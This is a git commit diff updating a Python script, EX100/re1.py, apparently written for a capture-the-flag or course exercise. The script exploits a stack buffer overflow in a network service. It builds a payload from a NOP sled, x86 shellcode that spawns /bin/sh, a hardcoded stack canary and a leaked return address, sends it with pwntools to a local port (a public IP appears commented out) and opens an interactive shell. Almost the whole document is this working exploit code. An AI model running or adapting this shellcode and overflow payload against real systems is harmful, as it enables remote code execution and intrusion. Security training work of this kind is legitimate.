5b3e74e3e6927dff68ccc8e7352b08f538295f2b
William Showalter <williamshowalter@gmail.com>
2015-09-21 15:23:39 -0500

    Updated EX100 script.

--- EX100/re1.py
+++ EX100/re1.py
@@ -2,77 +2,58 @@
 import re
 import struct
 import sys
-import socket
+from pwn import *
 
 BUFFER_SIZE = 128
-STACK_SPACE = "B"*12
+STACK_SPACE = "\x90"*12
 BYTES_TO_PASS_RPTR = 152
 BYTES_TO_COOKIE = 128
 
 #SHELL_CODE_EXIT = "\xb0\x01\x31\xdb\xcd\x80"
 #SHELL_CODE_HELLO = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"
 
-SHELL_CODE = "\x90"*10+\
-"\x31\xc0\xbb\xea\x1b\xe6\x77\x66\xb8\x88\x13\x50\xff\xd3"
-""" +\
-"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"+\
-"\x1E\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08" + \
+SHELL_CODE = "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB"+\
+"\x1E\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08" + \
 "\x83\xC3\x04" + \
 "\x89\x43\x08" + \
 "\x83\xEB\x04" + \
-"\xb0\x0e" +\
+"\xB0\x0E" +\
 "\x48\x48\x48" +\
-"\x8d\x4b\x08" + \
+"\x8D\x4B\x08" + \
 "\x83\xC3\x04" + \
-"\x8d\x53\x08" + \
+"\x8D\x53\x08" + \
 "\x83\xEB\x04" + \
-"\xcd\x80" +\
-"\xe8\xdd\xff\xff\xff"+\
-"\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"
-"""
-print len(SHELL_CODE)
-BUF_A = "A"*(BUFFER_SIZE-len(SHELL_CODE))
+"\xCD\x80" +\
+"\xE8\xDD\xFF\xFF\xFF"+\
+"\x2F\x62\x69\x6E\x2F\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"
+
+SLED = "\x90"*12
+REMAINING_BUFF = "\x90"*(BUFFER_SIZE-len(SHELL_CODE)-len(SLED))
 
 def makeShellWord(number):
 	return struct.pack('<I',number)
 
-COOKIE = makeShellWord(0x475a31a5)+makeShellWord(0x40501555)
+CANARY = makeShellWord(0x475a31a5)+makeShellWord(0x40501555)
 
 def makePayloadString(offset):
 	offset = int(offset,16)
-	payload_str = SHELL_CODE + BUF_A + COOKIE + STACK_SPACE
-	payload_str += makeShellWord(offset)
+	shell_ptr = makeShellWord(offset)
+
+	payload_str = SLED + SHELL_CODE + REMAINING_BUFF + \
+		CANARY + STACK_SPACE + shell_ptr
 	
 	return payload_str
 
 if __name__ == "__main__":
-	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#server_address = ('54.173.98.115',1259)
-	server_address = ('localhost',4001)	
-	sock.connect(server_address)
-	data = sock.recv(64)
+	#server_address = '54.173.98.115
+	#port = 1259
+	server_address = 'localhost'
+	port = 1259
+
+	sock = remote(server_address, port, timeout=None)
+	data = sock.recv(16)
 	print data[6::]
+	
 	payload = makePayloadString(data[6::])
-	sock.sendall(payload+"\n")
-	
-	boolnull = False
-	total = ""
-	sock.sendall("/bin/ls\n")
-	while not boolnull:
-		temp = sock.recv(1)
-		if not temp:
-			boolnull = True
-		else:
-			total += temp
-	print SHELL_CODE
-	print total
-	print len(total)-4
-	"""
-	total = total[len(payload)+5::]
-	total = total[14::]
-	while total.startswith("0x70257025"):
-		total = total[10::]
-	
-	i = 0
-	print total
-	"""
+	sock.sendline(payload)
+	sock.interactive()
